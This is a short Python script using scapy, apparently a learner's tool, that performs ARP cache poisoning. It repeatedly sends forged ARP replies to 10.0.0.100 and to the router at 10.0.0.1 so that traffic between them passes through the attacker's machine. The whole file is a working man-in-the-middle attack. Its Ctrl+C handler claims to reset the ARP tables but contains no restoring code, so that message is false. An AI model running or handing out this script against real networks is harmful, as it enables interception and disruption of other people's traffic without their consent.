import time

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast / arp_request
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op1 is for request, op2 is for response
    # pdst is the target ip address
    # hwdst is the target mac address
    # psrc is the source ip address which I set to router ip address
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


count = 0
try:
    while True:
        spoof("10.0.0.100", "10.0.0.1")
        spoof("10.0.0.1", "10.0.0.100")
        count += 2
        # \r is used to print on the same line
        # dynamic printing
        print("\r[+] packets sent: " + str(count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C .... Resetting ARP tables.... Please wait.")
